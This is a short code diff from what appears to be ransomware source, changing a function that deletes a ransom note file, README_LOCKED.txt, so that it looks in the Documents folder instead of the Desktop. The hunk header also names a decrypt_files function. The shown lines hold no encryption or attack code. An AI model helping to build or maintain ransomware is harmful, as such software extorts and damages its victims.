@@ -30,8 +30,8 @@ def decrypt_files(key):
 
 # Delete ransom note
 def delete_ransom_note():
-    desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
-    note_path = os.path.join(desktop, "README_LOCKED.txt")
+    doc = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Documents')
+    note_path = os.path.join(doc, "README_LOCKED.txt")
     if os.path.exists(note_path):
         os.remove(note_path)
 
